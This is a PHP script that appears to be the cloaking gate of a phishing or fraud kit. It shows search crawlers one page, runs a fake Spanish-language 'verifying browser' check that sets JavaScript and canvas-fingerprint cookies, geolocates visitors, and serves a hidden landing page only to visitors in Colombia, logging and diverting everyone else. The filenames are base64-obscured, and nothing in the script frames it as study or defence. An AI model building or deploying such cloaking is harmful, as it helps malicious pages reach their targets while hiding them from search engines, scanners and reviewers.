<?php
error_reporting(0);
ini_set('display_errors', 0);


$google_ips = ['66.249.66.1', '66.249.66.2'];
$index_file = base64_encode('index.html');
$ne_file = base64_encode('n.html');
$l_file = base64_encode('lad.html');

function b64d($str) {
    return base64_decode($str);
}

function getClientIP(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

function isGoogleBot($ua, $ip, $google_ips){
    return (strpos($ua, 'Googlebot') !== false) && in_array($ip, $google_ips);
}

function getCountryCode($ip){
    $default = 'UN';
    $json = @file_get_contents("http://ip-api.com/json/$ip");
    if(!$json) return $default;
    $data = json_decode($json,true);
    return $data['countryCode'] ?? $default;
}

function loadPage($b64file){
    echo file_get_contents(b64d($b64file));
    exit;
}

function logSuspicious($ip, $ua, $reason){
    $logfile = __DIR__.'/access.log';
    $line = date('Y-m-d H:i:s') . " | IP: $ip | UA: $ua | Reason: $reason\n";
    file_put_contents($logfile, $line, FILE_APPEND | LOCK_EX);
}

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = getClientIP();
$country = getCountryCode($ip);
$is_googlebot = isGoogleBot($ua, $ip, $google_ips);

$js_verified = $_COOKIE['js_verified'] ?? '0';
$canvas_fingerprint = $_COOKIE['canvas_fp'] ?? null;

if(!$is_googlebot && ($js_verified !== '1' || !$canvas_fingerprint)){
    echo <<<HTML
<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>Verificando navegador...</title></head>
<body>
<p>Verificando navegador, espere...</p>
<script>
document.cookie = "js_verified=1; path=/; max-age=3600; SameSite=Lax";
function getCanvasFp(){
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('fp', 2, 2);
    var dataUrl = canvas.toDataURL();
    return dataUrl;
}
var fp = getCanvasFp();
document.cookie = "canvas_fp=" + encodeURIComponent(fp) + "; path=/; max-age=3600; SameSite=Lax";
setTimeout(function(){
    location.reload();
}, 1000);
</script>
</body>
</html>
HTML;
    exit;
}

if($is_googlebot){
    loadPage($index_file);
}

if($country !== 'CO'){
    logSuspicious($ip, $ua, "Bloqueo geográfico país $country");
    loadPage($ne_file);
}

loadPage($l_file);
